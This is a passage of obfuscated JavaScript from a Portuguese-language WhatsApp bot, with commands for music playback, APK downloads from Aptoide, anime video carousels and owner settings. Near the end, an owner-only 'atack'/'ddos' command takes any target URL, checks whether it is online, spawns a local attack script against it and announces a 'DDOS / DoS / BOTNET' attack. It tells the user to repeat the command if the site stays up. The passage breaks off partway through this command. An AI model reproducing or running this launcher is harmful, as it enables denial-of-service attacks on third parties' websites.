                            title: "Lista de Funções..",
                            rows: []
                          }]
                        })
                      }]
                    }
                  }
                }, {});
              } catch (_0x5513f6) {
                console.log(_0x5513f6);
              }
              break;
            case "ativacoes_dono":
            case "ativações_dono":
              try {
                let _0x3d7d16 = carregarJSON("./DADOS/grupos/grupo_" + _0x4f1071 + ".json");
                if (botoes_) {
                  const _0x1f18a4 = {
                    text: " ATIVAÇÕES DE DONO DO " + NomeDoBot + "\n\nDono : " + NickDono + "\n"
                  };
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: _0x1f18a4,
                      footer: {
                        text: "Ative *Conscientemente* sobre o que cada função faz.."
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: "Lista de Funções..",
                            sections: [{
                              title: "Comandos de Ativar",
                              rows: [{
                                id: "" + (!_0x2ea32a ? _0x1d93be + "antiligar" : _0x1d93be + "antiligar"),
                                title: "" + (!_0x2ea32a ? "Ativar - para bloquear quem ligar para o bot.." : "Desativar - para bloquear quem ligar para o bot..")
                              }, {
                                id: "" + (!_0x5b41aa ? _0x1d93be + "visualizarmsg" : _0x1d93be + "visualizarmsg"),
                                title: "" + (!_0x5b41aa ? "Ativar - visualização automática msg pv/gp" : "Desativar - visualização automática para ler todas mensagens pv/gp do bot..")
                              }, {
                                id: "" + (!_0x303ef4 ? _0x1d93be + "console" : _0x1d93be + "console"),
                                title: "" + (!_0x303ef4 ? "Ativar - LEITURA NO CONSOLE DE CMD/MSG" : "Desativar - LEITURA NO CONSOLE DE CMD/MSG")
                              }, {
                                id: "" + (!_0x2129b6 ? _0x1d93be + "antipv" : _0x1d93be + "antipv"),
                                title: "" + (!_0x2129b6 ? "Ativar - Bloquear quem mandar mensagem pv.." : "Desativar - Bloquear quem mandar mensagem pv..")
                              }, {
                                id: "" + (!_0x5346a2 ? _0x1d93be + "antipv2" : _0x1d93be + "antipv2"),
                                title: "" + (!_0x5346a2 ? "Ativar Floodar quem mandar mensagem pv.." : "Desativar - Floodar quem mandar mensagem pv..")
                              }, {
                                id: "" + (!_0x2ae91c ? _0x1d93be + "antipv3" : _0x1d93be + "antipv3"),
                                title: "" + (!_0x5346a2 ? "Ativar - Ignorar  mensagem pv.. exceto Dono/Vip" : "Desativar - Ignorar  mensagem pv.. exceto Dono/Vip")
                              }, {
                                id: "" + (!_0x351d91 ? _0x1d93be + "audio-menu" : _0x1d93be + "audio-menu"),
                                title: "" + (!_0x351d91 ? "Ativar - Audio do menu.." : "Desativar - Audio do menu..")
                              }, {
                                id: "" + (!_0x167068 ? _0x1d93be + "verificado-global" : _0x1d93be + "verificado-global"),
                                title: "" + (!_0x167068 ? "Ativar - Verificado dos comandos.." : "Desativar - Verificado dos comandos..")
                              }, {
                                id: "" + (!_0xf63551 ? _0x1d93be + "botoff" : _0x1d93be + "boton"),
                                title: "" + (!_0xf63551 ? "Ativar - Desligar o bot completamente.." : "Desativar - Desligar o bot completamente..")
                              }, {
                                id: "" + (!_0x101fdd ? _0x1d93be + "modopuxadas 1" : _0x1d93be + "modopuxadas 0"),
                                title: "" + (!_0x101fdd ? "Ativar 𝗺𝗼𝗱𝗼 𝗽𝘂𝘇𝗮𝗱𝗮𝘀 nesse grupo..." : "Desativar 𝗺𝗼𝗱𝗼 𝗽𝘂𝘇𝗮𝗱𝗮𝘀 nesse grupo...")
                              }, {
                                id: "" + (!_0x2002ae ? _0x1d93be + "modoaluguel 1" : _0x1d93be + "modoaluguel 0"),
                                title: "" + (!_0x2002ae ? "Ativar Modo aluguel (💠 Pix Automático 💠) nesse grupo..." : "Desativar Modo aluguel (💠 Pix Automático 💠) nesse grupo...")
                              }, {
                                id: "" + (!_0x2f5db2 ? _0x1d93be + "modoaluguel2 1" : _0x1d93be + "modoaluguel2 0"),
                                title: "" + (!_0x2f5db2 ? "Ativar Modo aluguel 𝟮 nesse grupo..." : "Desativar Modo aluguel 𝟮 nesse grupo")
                              }, {
                                id: "" + (!_0x3d7d16.protecaoAtivada ? _0x1d93be + "alterar_protecao 1" : _0x1d93be + "alterar_protecao 0"),
                                title: "" + (!_0x3d7d16.protecaoAtivada ? "Ativar Anti Alterar Proteção (ADMS) promover / rebaixar nesse grupo..." : "Desativar Anti Alterar Proteção (ADMS) promover / rebaixar nesse grupo...")
                              }]
                            }]
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  const _0x25306e = {
                    url: logoslink.logo
                  };
                  const _0x1bb41c = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, {
                    image: _0x25306e,
                    caption: ativacoesdono(_0x1d93be, _0x2ea32a, _0x44ddae, _0x5b41aa, _0x303ef4, _0x2129b6, _0x5346a2, _0x2ae91c, _0x351d91, _0x167068, _0xf63551, _0x101fdd, _0x2002ae, _0x2f5db2, _0x3d7d16, botoes_, _0x24bf3d, _0x32e455)
                  }, _0x1bb41c);
                }
              } catch (_0x2504a5) {
                console.log(_0x2504a5);
              }
              break;
            case "play":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Onde está o nome? Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " nome ou link");
                }
                const _0x8a8c5d = {
                  text: "🎶",
                  key: _0x302296.key
                };
                const _0x193866 = {
                  react: _0x8a8c5d
                };
                _0x263319.sendMessage(_0x4f1071, _0x193866);
                const _0x34f903 = await fetchJson(SITE_JEFF_APIS + "/api/ytsrc?q=" + _0x1d6557 + "&apikey=" + _0x512d5e);
                const _0x460762 = _0x34f903.resultado;
                if (!_0x460762 || _0x460762.length === 0) {
                  const _0x533947 = {
                    text: "❌",
                    key: _0x302296.key
                  };
                  const _0x37cb3b = {
                    react: _0x533947
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x37cb3b);
                  return _0x403602("Desculpe, não consegui encontrar a música. Tente fornecer mais detalhes.");
                }
                const _0xdd23cc = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0x470894 = {
                  react: _0xdd23cc
                };
                _0x263319.sendMessage(_0x4f1071, _0x470894);
                const _0x55431e = _0x460762[0];
                const _0xb382b0 = SITE_JEFF_APIS + "/api/canvas/musicardbun/music?nome=" + encodeURIComponent(_0x55431e.title) + "&autor=" + encodeURIComponent(_0x55431e.author.name) + "&tipo=space&opacity=2.0&thumb=" + encodeURIComponent(_0x55431e.thumbnail) + "&progresso=25&start=0:00&end=" + encodeURIComponent(_0x55431e.timestamp) + "&apikey=" + _0x512d5e;
                const _0x543af6 = ("\n      🎶 *PLAY MUSIC* 🎶\n      \n🎵 *Título:* " + F + _0x55431e.title + F + "\n📺 *Canal:* " + F + _0x55431e.author.name + F + "\n⏳ *Duração:* " + F + _0x55431e.timestamp + F + "\n📅 *Postado:* " + F + _0x55431e.ago + F + "\n👁️ *Visualizações:* " + F + _0x55431e.views + F + "\n🔗 *Link:* " + F + _0x55431e.url + F + "\n").trim();
                if (botoes_) {
                  const _0x39f18c = _0x460762.length;
                  const _0x42cbef = _0x460762.slice(0, _0x39f18c).map((_0x53a51f, _0x3e2482) => ({
                    id: _0x1d93be + "playbt " + _0x53a51f.url,
                    header: "Opção " + (_0x3e2482 + 1),
                    title: "Canal: ➥ " + _0x53a51f.author.name,
                    description: "Título: " + _0x53a51f.title + "\nTempo: " + _0x53a51f.timestamp
                  }));
                  const _0x1d578a = _0x460762.slice(0, _0x39f18c).map((_0x2a32ad, _0x3c6871) => ({
                    id: _0x1d93be + "play_vdbt " + _0x2a32ad.url,
                    header: "Opção " + (_0x3c6871 + 1),
                    title: "Canal: ➥ " + _0x2a32ad.author.name,
                    description: "Título: " + _0x2a32ad.title + "\nTempo: " + _0x2a32ad.timestamp
                  }));
                  const _0x5222f0 = "Tempo de reprodução";
                  const _0x3bb843 = "┏━━━━━━━━━━━━━━━━┓\n┃ 🎵 *PLAY YOUTUBE* 🎵  ┃\n┣━━━━━━━━━━━━━━━━┫\n┃         " + _0x5222f0 + "\n┃ 📊 𝐑𝐞𝐬𝐮𝐥𝐭𝐚𝐝𝐨𝐬: " + _0x39f18c + "\n┗━━━━━━━━━━━━━━━━┛";
                  const _0x1ea39c = {
                    text: _0x3bb843
                  };
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: _0x1ea39c,
                      footer: {
                        text: "➤ 𝑬𝒔𝒄𝒐𝒍𝒉𝒂 𝒖𝒎𝒂 𝒐𝒑çã𝒐:"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: "ÁUDIO",
                            sections: [{
                              title: "Resultados de Áudio",
                              rows: _0x42cbef
                            }]
                          })
                        }, {
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: "VÍDEO",
                            sections: [{
                              title: "Resultados de Vídeo",
                              rows: _0x1d578a
                            }]
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  const _0x30d579 = SITE_JEFF_APIS + "/api/dl/ytaudio2?url=" + encodeURIComponent(_0x55431e.url) + "&apikey=" + _0x512d5e;
                  const _0x1cdad3 = {
                    url: _0xb382b0
                  };
                  const _0xeeb119 = {
                    image: _0x1cdad3,
                    caption: _0x543af6
                  };
                  const _0x367e99 = {
                    quoted: _0xa6b34
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0xeeb119, _0x367e99);
                  const _0x4f796b = {
                    url: _0x30d579
                  };
                  const _0x2a069b = {
                    audio: _0x4f796b,
                    mimetype: "audio/mpeg"
                  };
                  const _0x276d8b = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x2a069b, _0x276d8b);
                  const _0x472ede = {
                    text: "✅",
                    key: _0x302296.key
                  };
                  const _0x5a307c = {
                    react: _0x472ede
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x5a307c);
                }
              } catch (_0x431445) {
                console.error(_0x431445);
                _0x403602("Erro ao processar sua solicitação. Tente novamente mais tarde.");
                const _0x2cbe87 = {
                  text: "📴",
                  key: _0x302296.key
                };
                const _0x3941b4 = {
                  react: _0x2cbe87
                };
                _0x263319.sendMessage(_0x4f1071, _0x3941b4);
              }
              break;
            case "aptoide":
            case "aptoide2":
              if (_0x40e45c.length == 0) {
                return _0x403602("Cadê o nome do app? *Use como exemplo:* " + _0x1d93be + " + " + _0x3dec88 + "aptoide WhatsApp");
              }
              try {
                const _0x40f257 = {
                  text: "♨️",
                  key: _0x302296.key
                };
                const _0x8ab78b = {
                  react: _0x40f257
                };
                _0x263319.sendMessage(_0x4f1071, _0x8ab78b);
                const _0x6f3cfa = await axios.get(SITE_JEFF_APIS + "/search/srchaptoid?query=" + encodeURIComponent(_0x40e45c.join(" ")) + "&apikey=" + _0x512d5e);
                if (_0x6f3cfa.data.datalist.total == 0) {
                  return;
                }
                const _0x16b398 = _0x6f3cfa.data.datalist.list.map((_0x1a780d, _0xeb3261) => ({
                  id: _0x1d93be + "aptoidedownload " + _0x1a780d.file.path_alt,
                  header: "Opção " + (_0xeb3261 + 1),
                  title: "Nome: " + _0x1a780d.name,
                  description: "Tamanho: " + (_0x1a780d.size / 1048576).toFixed(1) + " MB\nVersão: " + _0x1a780d.file.vername
                }));
                if (botoes_) {
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: {
                        text: "─────────────────────\n\n      【﻿░𝗔░𝗣░𝗧░𝗢░𝗜░𝗗░𝗘░】\n\n─────────────────────\nAplicativos encontrados:"
                      },
                      footer: {
                        text: "Resultados da pesquisa"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: "Resultados",
                            sections: [{
                              title: "Resultados do Aptoide",
                              rows: _0x16b398
                            }]
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  if (_0x40e45c.length == 0) {
                    return _0x403602("Cadê o nome do app? *Use como exemplo:* " + _0x1d93be + " + " + _0x3dec88 + "aptoide WhatsApp");
                  }
                  try {
                    const _0x5bc573 = {
                      text: "⏳",
                      key: _0x302296.key
                    };
                    const _0x40e380 = {
                      react: _0x5bc573
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x40e380);
                    const _0x403592 = await axios.get(SITE_JEFF_APIS + "/search/srchaptoid?query=" + encodeURIComponent(_0x40e45c.join(" ")) + "&apikey=" + _0x512d5e);
                    if (_0x403592.data.datalist.total == 0) {
                      return;
                    }
                    const _0x279132 = await fetch(_0x403592.data.datalist.list[0].graphic);
                    const _0x621709 = await _0x279132.arrayBuffer();
                    const _0x128714 = Buffer.from(_0x621709);
                    const _0x245811 = await axios.get(SITE_JEFF_APIS + "/download/aptoid?link=" + _0x403592.data.datalist.list[0].file.path_alt + "&apikey=" + _0x512d5e);
                    const _0x396a7e = {
                      text: "✅",
                      key: _0x302296.key
                    };
                    const _0x7e4d7c = {
                      react: _0x396a7e
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x7e4d7c);
                    const _0xc41c96 = "\n      【﻿░𝗔░𝗣░𝗧░𝗢░𝗜░𝗗░𝗘░】\n\n\n• Nome: *" + _0x403592.data.datalist.list[0].name + "*\n─────────────────────\n• Pacote do aplicativo: *" + _0x403592.data.datalist.list[0].package + "*\n─────────────────────\n• Tamanho do arquivo: *" + (_0x403592.data.datalist.list[0].size / 1048576).toFixed(1) + " MB*\n─────────────────────\n• Versão do aplicativo: *" + _0x403592.data.datalist.list[0].file.vername + "*\n─────────────────────\n\n📥 𝘙𝘦𝘢𝘭𝘪𝘻𝘢𝘯𝘥𝘰 𝘰 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥...";
                    const _0x52094f = {
                      image: _0x128714,
                      caption: _0xc41c96
                    };
                    const _0x4d5b67 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x52094f, _0x4d5b67);
                    const _0x20d34a = {
                      url: _0x403592.data.datalist.list[0].file.path
                    };
                    const _0x3b1959 = {
                      document: _0x20d34a,
                      mimetype: "application/vnd.android.package-archive",
                      fileName: _0x403592.data.datalist.list[0].name + ".apk",
                      caption: ""
                    };
                    const _0x2179a9 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x3b1959, _0x2179a9);
                  } catch (_0xcc446a) {
                    const _0x26b549 = {
                      text: "❌",
                      key: _0x302296.key
                    };
                    const _0x2c4732 = {
                      react: _0x26b549
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x2c4732);
                    console.error(_0xcc446a);
                    return _0x403602("𝘿𝙀𝙎𝘾𝙐𝙇𝙋𝙀, 𝙉Ã𝙊 𝘾𝙊𝙉𝙎𝙀𝙂𝙐𝙄𝙍 𝙀𝙉𝘾𝙊𝙉𝙏𝙍𝘼𝙍 𝙀𝙎𝙎𝙀 𝘼𝙋𝙇𝙄𝘾𝘼𝙏𝙄𝙑𝙊 𝙏𝙀𝙉𝙏𝙀 𝙊𝙐𝙏𝙍𝙊 𝙏𝙀𝙍𝙈𝙊");
                  }
                }
              } catch (_0x2ac633) {
                const _0x6a1932 = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x31d440 = {
                  react: _0x6a1932
                };
                _0x263319.sendMessage(_0x4f1071, _0x31d440);
                console.error(_0x2ac633);
                return _0x403602("𝘿𝙀𝙎𝘾𝙐𝙇𝙋𝙀, 𝙉Ã𝙊 𝘾𝙊𝙉𝙏𝙄𝙉𝙐𝙄𝙍 𝙀𝙉𝘾𝙊𝙉𝙏𝙍𝘼𝙍 𝙀𝙎𝙎𝙀 𝘼𝙋𝙇𝙄𝘾𝘼𝙏𝙄𝙑𝙊 𝙏𝙀𝙉𝙏𝙀 𝙊𝙐𝙏𝙍𝙊 𝙏𝙀𝙍𝙈𝙊");
              }
              break;
            case "aptoidedownload":
              try {
                const _0x1fd284 = "" + _0x1d6557;
                const _0x4e3da4 = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0x11b36a = {
                  react: _0x4e3da4
                };
                _0x263319.sendMessage(_0x4f1071, _0x11b36a);
                const _0xa27192 = await axios.get(SITE_JEFF_APIS + "/download/aptoid?link=" + _0x1fd284 + "&apikey=" + _0x512d5e);
                const _0x59a579 = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x1c69e0 = {
                  react: _0x59a579
                };
                _0x263319.sendMessage(_0x4f1071, _0x1c69e0);
                const _0x121ebe = "\n─────────────────────\n📥 𝘙𝘦𝘢𝘭𝘪𝘻𝘢𝘯𝘥𝘰 𝘰 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥...\n─────────────────────";
                _0x403602("" + _0x121ebe);
                const _0x4242f1 = {
                  url: _0x1fd284
                };
                const _0x2a2aa2 = {
                  document: _0x4242f1,
                  mimetype: "application/vnd.android.package-archive",
                  fileName: "aplicativo-baixado.apk",
                  caption: ""
                };
                const _0x459669 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x2a2aa2, _0x459669);
              } catch (_0x5edc23) {
                const _0x21bea3 = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x4ed152 = {
                  react: _0x21bea3
                };
                _0x263319.sendMessage(_0x4f1071, _0x4ed152);
                console.error(_0x5edc23);
                return _0x403602("𝘿𝙀𝙎𝘾𝙐𝙇𝙋𝙀, 𝙉Ã𝙊 𝘾𝙊𝙉𝙎𝙀𝙂𝙐𝙄𝙍 𝙀𝙉𝘾𝙊𝙉𝙏𝙍𝘼𝙍 𝙀𝙎𝙎𝙀 𝘼𝙋𝙇𝙄𝘾𝘼𝙏𝙄𝙑𝙊 𝙏𝙀𝙉𝙏𝙀 𝙊𝙐𝙏𝙍𝙊 𝙏𝙀𝙍𝙈𝙊");
              }
              break;
            case "termosok":
              _0x2c9a79.push(_0x32e455);
              fs.writeFileSync("./DADOS/usuarios/termos.json", JSON.stringify(_0x2c9a79));
              _0x403602("Agradecemos por concordar com nossos termos.🙂");
              break;
            case "ls":
              {
                if (!_0x2a5ff3 && !_0x35021e) {
                  return;
                }
                exec("ls -p | awk '{print ($0 ~ /\\//) ? \"📁 \" substr($0, 1, length($0)-1) : \"📄 \" $0}'", (_0x203185, _0x3fd70c) => {
                  if (_0x203185) {
                    return _0x403602("" + _0x203185);
                  }
                  if (_0x3fd70c) {
                    _0x403602(_0x3fd70c);
                  }
                });
              }
              break;
            case "infotokenpix":
              _0x403602("\nTUTORIAL PARA PEGAR O TOKEN DO MERCADO PAGO\n\n1. Crie uma conta no Mercado Pago \n   Se você ainda não tem uma conta, vá para o app do Mercado Pago e crie uma. e cadastre uma chave pix ( aconselho usar e-mail )\n\n2. Acesse o Painel do Desenvolvedor do Mercado Pago\n   \n   link do site: https://www.mercadopago.com.br/developers/panel/app\n\nvideo explicativo: https://youtu.be/ctwqHp1H0-0\n\n_______________________________________\n\nTUTORIAL PARA POR O TOKEN NO X-BOT\n\n Depois que tiver em mãos o token de acesso, vai no pv do bot e digita " + _0x1d93be + "token_mp SEUTOKEN\n \n \nali em \"SEUTOKEN\" voce ira por o token e da enter.\n depois disso,  se quiser pode  mudar os valores na pasta: dono/menus arquivo: menus.js\n \n e isso, espero que consiga ^-^\n atenciosamente: @jefferson_ddos\n ");
              break;
            case "jaum":
              try {
                const _0x334d34 = "https://telegra.ph/file/8591965dd7fd8951ce760.jpg";
                const _0x4bc95d = {
                  url: _0x334d34
                };
                const _0x3beb17 = {
                  image: _0x4bc95d
                };
                const _0x557d9b = {
                  upload: _0x263319.waUploadToServer
                };
                const _0x428f04 = await prepareWAMessageMedia(_0x3beb17, _0x557d9b);
                const _0xc4796 = {
                  hasMediaAttachment: true,
                  imageMessage: _0x428f04.imageMessage
                };
                const _0x53bd67 = {
                  header: _0xc4796,
                  headerType: "IMAGE",
                  body: {
                    text: "jaum bctudo"
                  },
                  footer: {},
                  nativeFlowMessage: {
                    buttons: []
                  }
                };
                _0x53bd67.footer.text = "by: jaum dev";
                const _0x169e48 = {
                  hasMediaAttachment: true,
                  imageMessage: _0x428f04.imageMessage
                };
                const _0x158b24 = {
                  header: _0x169e48,
                  headerType: "IMAGE",
                  body: {
                    text: " é u jaum né vida2"
                  },
                  footer: {},
                  nativeFlowMessage: {
                    buttons: []
                  }
                };
                _0x158b24.footer.text = "Ula";
                const _0x3fd8b1 = {
                  cards: [_0x53bd67, _0x158b24]
                };
                const _0x3f9a70 = {
                  carouselMessage: _0x3fd8b1
                };
                const _0x23488a = {
                  interactiveMessage: _0x3f9a70
                };
                _0x263319.relayMessage(_0x4f1071, _0x23488a, {});
              } catch (_0x506b69) {
                enviar(_0x506b69);
              }
              break;
            case "c":
              try {
                const _0x4d2289 = "https://telegra.ph/file/91048bfb6a0ca7c3118b9.mp4";
                const _0x4f24da = {
                  url: _0x4d2289
                };
                const _0x50d0f9 = {
                  video: _0x4f24da
                };
                const _0x8673b4 = {
                  upload: _0x263319.waUploadToServer
                };
                const _0x1e30f6 = await prepareWAMessageMedia(_0x50d0f9, _0x8673b4);
                const _0x386998 = {
                  hasMediaAttachment: true,
                  videoMessage: _0x1e30f6.videoMessage
                };
                const _0x24abd1 = {
                  header: _0x386998,
                  headerType: "VIDEO",
                  body: {
                    text: ""
                  },
                  footer: {
                    text: ""
                  },
                  nativeFlowMessage: {
                    buttons: []
                  }
                };
                const _0x12d091 = {
                  hasMediaAttachment: true,
                  videoMessage: _0x1e30f6.videoMessage
                };
                const _0x1d8c3b = {
                  header: _0x12d091,
                  headerType: "VIDEO",
                  body: {
                    text: ""
                  },
                  footer: {
                    text: ""
                  },
                  nativeFlowMessage: {
                    buttons: []
                  }
                };
                const _0xc02ca = {
                  cards: [_0x24abd1, _0x1d8c3b]
                };
                const _0x3c56df = {
                  carouselMessage: _0xc02ca
                };
                const _0x441291 = {
                  interactiveMessage: _0x3c56df
                };
                _0x263319.relayMessage(_0x4f1071, _0x441291, {});
              } catch (_0x2b6aab) {
                enviar(_0x2b6aab);
              }
              break;
            case "tt":
              try {
                _0x403602("Realizando ação..");
                const _0x324482 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  video: {
                    url: SITE_JEFF_APIS + "/api/editsvideo?categoria=naruto&apikey=" + _0x512d5e
                  },
                  mimetype: "video/mp4"
                }, _0x324482).catch(_0x5dfa9a => {
                  return _0x403602("Erro..");
                });
              } catch (_0x284dcc) {
                return _0x403602("Erro...");
              }
              break;
            case "editanime":
              try {
                if (botoes_) {
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: {
                        text: "EDITS DE ANIMES"
                      },
                      footer: {
                        text: "Escolha a categoria"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: "CATEGORIAS",
                            sections: [{
                              title: "Categorias...",
                              rows: [{
                                id: _0x1d93be + "edit -random",
                                title: "EDITS ALEATÓRIAS",
                                description: "ALEATÓRIAS"
                              }, {
                                id: _0x1d93be + "edit -bleach",
                                title: "EDITS BLEACH",
                                description: "BLEACH"
                              }, {
                                id: _0x1d93be + "edit -chainsaw",
                                title: "EDITS CHAINSAW",
                                description: "CHAINSAW"
                              }, {
                                id: _0x1d93be + "edit -dragonball",
                                title: "EDITS DRAGONBALL",
                                description: "DRAGONBALL"
                              }, {
                                id: _0x1d93be + "edit -kimetsu",
                                title: "EDITS KIMETSU",
                                description: "DEMON-SLEYER"
                              }, {
                                id: _0x1d93be + "edit -jujutsu",
                                title: "EDITS JUJUTSU",
                                description: "JUJUTSU-KAISEN"
                              }, {
                                id: _0x1d93be + "edit -naruto",
                                title: "EDITS NARUTO",
                                description: "NARUTO"
                              }]
                            }]
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  _0x403602("Botoes estao desativado!\n        escolha um termo \n       Use Ex: " + _0x1d93be + "edit naruto\n       \n       \n  Termos: \n    \n Naruto\n random\n bleach\n chainsaw\n dragonball\n kimetsu\n jujutsu\n ");
                }
              } catch (_0x2939d6) {
                _0x403602(_0x2939d6);
              }
              break;
            case "edit":
              if (!_0x1d6557) {
                return _0x403602(mess.exeAnimeEdit(_0x1d93be));
              }
              const _0x520579 = {
                "-random": "random",
                "-bleach": "bleach",
                "-chainsaw": "chainsaw",
                "-kimetsu": "demon_slayer",
                "-dragonball": "dragonball",
                "-jujutsu": "jujutsu_kaisen",
                "-naruto": "naruto"
              };
              const _0x281ae8 = _0x520579[_0x40e45c[0]];
              if (!_0x281ae8) {
                return _0x403602("Categoria inválida! As categorias válidas são: " + Object.keys(_0x520579).join(", "));
              }
              _0x403602(enviar.espere);
              try {
                let _0x12e969 = [];
                let _0x4bb7e0;
                if (_0x281ae8 === "random") {
                  _0x4bb7e0 = [SITE_JEFF_APIS + "/api/editsvideo?categoria=bleach&apikey=" + _0x512d5e, SITE_JEFF_APIS + "/api/editsvideo?categoria=chainsaw&apikey=" + _0x512d5e, SITE_JEFF_APIS + "/api/editsvideo?categoria=demon_slayer&apikey=" + _0x512d5e, SITE_JEFF_APIS + "/api/editsvideo?categoria=dragonball&apikey=" + _0x512d5e];
                } else {
                  _0x4bb7e0 = [SITE_JEFF_APIS + "/api/editsvideo?categoria=" + _0x281ae8 + "&apikey=" + _0x512d5e, SITE_JEFF_APIS + "/api/editsvideo?categoria=" + _0x281ae8 + "&apikey=" + _0x512d5e, SITE_JEFF_APIS + "/api/editsvideo?categoria=" + _0x281ae8 + "&apikey=" + _0x512d5e, SITE_JEFF_APIS + "/api/editsvideo?categoria=" + _0x281ae8 + "&apikey=" + _0x512d5e];
                }
                for (let _0x4c3740 of _0x4bb7e0) {
                  try {
                    const _0x326a63 = {
                      url: _0x4c3740
                    };
                    const _0x26a7ef = {
                      video: _0x326a63
                    };
                    const _0x310163 = {
                      upload: _0x263319.waUploadToServer
                    };
                    let _0xcd5b08 = await prepareWAMessageMedia(_0x26a7ef, _0x310163);
                    if (_0xcd5b08 && _0xcd5b08.videoMessage) {
                      _0x12e969.push(_0xcd5b08.videoMessage);
                    } else {
                      return _0x403602("" + _0x4c3740);
                    }
                  } catch (_0x3af4ac) {
                    return _0x403602("link do video ta cm pobrema, link: " + _0x4c3740);
                  }
                }
                if (_0x12e969.length === 4) {
                  const _0x4bebaa = {
                    hasMediaAttachment: true,
                    videoMessage: _0x12e969[0]
                  };
                  const _0x2dcbad = {
                    header: _0x4bebaa,
                    headerType: "VIDEO",
                    body: {
                      text: ""
                    },
                    footer: {
                      text: ""
                    },
                    nativeFlowMessage: {
                      buttons: []
                    }
                  };
                  const _0x5e59df = {
                    hasMediaAttachment: true,
                    videoMessage: _0x12e969[1]
                  };
                  const _0x2f24c4 = {
                    header: _0x5e59df,
                    headerType: "VIDEO",
                    body: {
                      text: ""
                    },
                    footer: {
                      text: ""
                    },
                    nativeFlowMessage: {
                      buttons: []
                    }
                  };
                  const _0x2995c7 = {
                    hasMediaAttachment: true,
                    videoMessage: _0x12e969[2]
                  };
                  const _0x5a20d0 = {
                    header: _0x2995c7,
                    headerType: "VIDEO",
                    body: {
                      text: ""
                    },
                    footer: {
                      text: ""
                    },
                    nativeFlowMessage: {
                      buttons: []
                    }
                  };
                  const _0x5b7dba = {
                    hasMediaAttachment: true,
                    videoMessage: _0x12e969[3]
                  };
                  const _0x51c8b4 = {
                    header: _0x5b7dba,
                    headerType: "VIDEO",
                    body: {
                      text: ""
                    },
                    footer: {
                      text: ""
                    },
                    nativeFlowMessage: {
                      buttons: []
                    }
                  };
                  const _0x1f3f75 = {
                    cards: [_0x2dcbad, _0x2f24c4, _0x5a20d0, _0x51c8b4]
                  };
                  const _0x1c7d26 = {
                    carouselMessage: _0x1f3f75
                  };
                  const _0x2302f4 = {
                    interactiveMessage: _0x1c7d26
                  };
                  let _0xe28652 = _0x2302f4;
                  await _0x263319.relayMessage(_0x4f1071, _0xe28652, {});
                } else {
                  return _0x403602("erro no envio da bct da lista");
                }
              } catch (_0x16275d) {
                return _0x403602("deu erro no final bct");
              }
              break;
            case "atack":
            case "ddos":
              if (!_0x2a5ff3) {
                return _0x403602("*[❗] SOMENTE O MEU DONO [❗]*");
              }
              if (!_0x1d6557) {
                return _0x403602("*[⚠️] Ei, está faltando o alvo para mim iniciar o atack*\n\nEX: " + _0x1d93be + "atack url do alvo");
              }
              const _0x5295ed = _0x40e45c.join(" ");
              if (_0x5295ed.includes("${SITE_JEFF_APIS}")) {
                return _0x403602("*[❗] Não é permitido atacar a rest-api do meu criador😤 [❗]*");
              }
              let _0x596b31;
              axios.get("" + _0x5295ed).then(_0x16e003 => {
                _0x596b31 = "🟢 ONLINE";
                _0x1a92fe(_0x5295ed, _0x596b31);
              }).catch(_0x4552c0 => {
                _0x596b31 = "🔴 OFF-LINE";
                _0x1a92fe(_0x5295ed, _0x596b31);
              });
              function _0x1a92fe(_0x15412d, _0x2d492a) {
                const _0x17b173 = "./lib/script.js";
                const _0x52e32a = "" + _0x15412d;
                const _0x4d7220 = 10;
                const _0x5dd486 = _0x3dd216("node", [_0x17b173, _0x52e32a, _0x4d7220]);
                _0x5dd486.stdout.on("data", _0x442b72 => {
                  console.log("stdout: " + _0x442b72);
                });
                _0x5dd486.stderr.on("data", _0x3c9b6d => {
                  console.error("stderr: " + _0x3c9b6d);
                });
                _0x5dd486.on("close", _0x5588df => {
                  console.log("Child process exited with code " + _0x5588df);
                });
                setTimeout(async () => {
                  const _0x1eb3c7 = {
                    text: "⚠️ INICIANDO ATAQUE DDOS / DoS / BOTNET\n  \n  🎯 ALVO: " + _0x15412d + "\n  \n  🛜 STATUS DO ALVO\n  -> " + _0x2d492a + "\n  \n  *EXECUTE O COMANDO MAIS VEZES CASO O ALVO NÃO CAIA!*"
                  };
                  const _0x454de2 = {
                    display_text: "⚠️ EXECUTAR NOVAMENTE ⚠️",
